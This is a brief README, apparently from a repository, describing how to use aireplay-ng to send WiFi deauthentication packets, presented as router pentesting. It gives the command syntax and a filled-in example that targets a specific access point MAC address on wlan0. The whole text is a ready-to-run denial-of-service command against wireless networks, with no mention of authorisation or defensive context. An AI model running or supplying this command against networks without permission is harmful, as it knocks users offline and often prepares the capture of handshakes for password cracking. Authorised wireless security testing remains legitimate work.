# aireplay-ng
This script automates the process of pentesting a WiFi router by sending deauth packets 

Syntaxis:
sudo aireplay-ng -0 <number of packets> -a <WIFI MAC> wlan0 

Example:
sudo aireplay-ng -0 15 -a 00:B0:D0:63:C2:26 wlan0
